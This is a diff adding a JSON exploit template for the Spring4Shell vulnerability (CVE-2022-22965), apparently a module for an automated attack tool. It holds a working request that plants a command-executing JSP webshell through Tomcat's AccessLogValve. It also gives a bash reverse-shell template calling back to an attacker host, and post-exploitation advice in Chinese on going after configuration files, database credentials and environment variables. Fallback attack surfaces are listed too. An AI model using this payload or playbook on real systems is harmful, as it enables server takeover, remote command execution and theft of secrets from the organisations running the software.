@@ -1,0 +1,119 @@
+{
+  "id": "spring-cve-2022-22965-spring4shell",
+  "family": "spring",
+  "product": "Spring Framework",
+  "cve": "CVE-2022-22965",
+  "aliases": [
+    "Spring4Shell",
+    "Spring Framework Data Binder RCE"
+  ],
+  "severity": "critical",
+  "tags": [
+    "spring",
+    "spring4shell",
+    "tomcat",
+    "databinding",
+    "jsp"
+  ],
+  "applicability": {
+    "versions": [
+      "Spring Framework 5.3.0-5.3.17",
+      "Spring Framework 5.2.0-5.2.19"
+    ],
+    "fingerprints": [
+      "Spring MVC or Spring Boot packaged as WAR on standalone Tomcat",
+      "Java 9+ runtime",
+      "Request parameters appear to bind into model objects on unauthenticated endpoints"
+    ],
+    "signals": [
+      "Tomcat-specific resources.context.parent.pipeline path is relevant",
+      "Binder behavior changes when class.module.classLoader parameters are supplied",
+      "A writable log or webroot path is plausible inside Tomcat"
+    ]
+  },
+  "preconditions": [
+    "The application must run on Tomcat as a WAR rather than an executable JAR-only layout.",
+    "The vulnerable data binder path must be reachable on a controller endpoint.",
+    "A writable location must exist if the chosen technique drops a JSP shell through AccessLogValve."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=spring4shellprobe&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_",
+        "matchers": [
+          "400/500 binder anomaly on vulnerable paths",
+          "Subsequent request reveals controlled Tomcat logging side effect only if conditions match"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "file_write",
+    "requests": [
+      {
+        "path": "/",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22cmd%22.equals(request.getParameter(%22pwd%22))){java.io.InputStream%20in%20=%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream();int%20a=-1;byte[]%20b=new%20byte[2048];while((a=in.read(b))!=-1){out.println(new%20String(b,0,a));}}%25%7Bc2%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+        "os_hint": "linux"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先判断是否真的是 WAR + Tomcat 场景，不满足条件时不要反复写 Valve 参数。",
+      "写出 JSP 后立即验证最小命令执行，再记录 webroot、部署目录和日志配置。",
+      "如果已经得到稳定 webshell，优先转向配置文件、数据库凭据和环境变量，而不是继续改写 Tomcat 管线。"
+    ],
+    "shell_options": [
+      {
+        "type": "jsp_webshell_write",
+        "template": "Use AccessLogValve pattern write to drop {jsp_name}.jsp under {webroot}, then access /{jsp_name}.jsp?pwd={guard}&cmd=id"
+      },
+      {
+        "type": "bash_reverse_shell",
+        "template": "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先确认 Spring、Tomcat、WAR、JDK 版本这四个条件。",
+      "先做低影响 binder or valve probe，再做 JSP 投递。",
+      "成功后尽量只保留一个稳定 webshell，不再频繁改写 AccessLogValve。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "cat /etc/issue",
+      "env"
+    ],
+    "shell_prerequisites": [
+      "确认 webapps/ROOT 或其他部署目录可被 Tomcat AccessLogValve 写入。",
+      "确认目标不是只读镜像或只读容器文件系统。"
+    ],
+    "fallbacks": [
+      "如果 WAR/Tomcat 条件不成立，转向 Spring Cloud Gateway、Spring Cloud Function、Actuator、SpEL 或普通 Web 漏洞面。",
+      "如果 JSP 未落地，尝试其他可写目录或不同应用上下文目录。"
+    ]
+  },
+  "detection_notes": [
+    "Spring4Shell 条件比很多公开 PoC 想象得更苛刻，命中前应先核实部署方式。",
+    "这类利用会修改服务器日志管线，比赛环境里也要谨慎控制次数。"
+  ],
+  "references": [
+    "Spring Framework CVE-2022-22965 advisories",
+    "Public Spring4Shell reproduction and deployment-condition analyses"
+  ]
+}
